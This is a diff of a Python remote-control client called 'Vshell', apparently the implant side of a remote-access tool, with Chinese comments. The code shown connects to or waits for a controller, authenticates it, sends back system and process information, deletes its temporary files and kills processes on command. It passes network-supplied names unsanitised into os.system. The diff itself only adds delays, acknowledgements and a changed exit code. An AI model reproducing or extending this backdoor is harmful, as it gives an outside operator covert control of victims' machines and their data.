@@ -6,7 +6,7 @@ import socket
 import time
 import os
 
-# 变量定义
+# 变量定义 ACTIVE 是否主动连接控制端 / SYS 被控端系统类型自动填写不用管
 ACTIVE = 1
 IP = '127.0.0.1'
 PORT = 9481
@@ -45,7 +45,6 @@ def Passive():
 def PassCheck(sock):
     while True:
         cmd = sock.recv(1024)
-        time.sleep(1)
         if cmd.decode('utf-8') == 'Vshell P%s' %PASS:
             sock.send(b'HiAdmin')
             return True
@@ -63,6 +62,7 @@ def Getinfo(sock):
         f.close()
         data = data.encode('utf-8')
         sock.send(data)
+        time.sleep(0.1)
         sock.send(b'End')
         os.system('del /f /q C:\\ProgramData\\info.txt')
         return
@@ -74,6 +74,7 @@ def Getinfo(sock):
         f.close()
         data = data.encode('utf-8')
         sock.send(data)
+        time.sleep(0.1)
         sock.send(b'End')
         os.system('rm -f info.txt')
         return
@@ -91,6 +92,7 @@ def GetMoreinfo(sock,target):
     f.close()
     data = data.encode('utf-8')
     sock.send(data)
+    time.sleep(0.1)
     sock.send(b'End')
     os.system('rm -f info.txt')
 
@@ -103,6 +105,7 @@ def Process(sock):
         f.close()
         data = data.encode('utf-8')
         sock.send(data)
+        time.sleep(0.1)
         sock.send(b'End')
         os.system('del /f /q C:\\ProgramData\\info.txt')
         return
@@ -113,6 +116,7 @@ def Process(sock):
         f.close()
         data = data.encode('utf-8')
         sock.send(data)
+        time.sleep(0.1)
         sock.send(b'End')
         os.system('rm -f info.txt')
         return
@@ -123,6 +127,9 @@ def KillName(sock):
     name = d.decode('utf-8')
     if SYS == 'nt':
         os.system('taskkill /f /im %s' %name)
+        sock.send(b'The command has been executed.')
+    else:
+        sock.send(b'This is Linux OS. Can\'t execute the command.')
     return
 
 # Kill进程 by ID
@@ -133,6 +140,7 @@ def KillId(sock):
         os.system('taskkill /f /pid %s' %id)
     else:
         os.system('kill -9 %s' %id)
+    sock.send(b'The command has been executed.')
     return
 
 # 主程序
@@ -161,6 +169,6 @@ while True:
         KillName(s)
     elif d == b'2x02':
         KillId(s)
-    elif d == b'2x03':
+    elif d == b'3':
         break
 s.close()
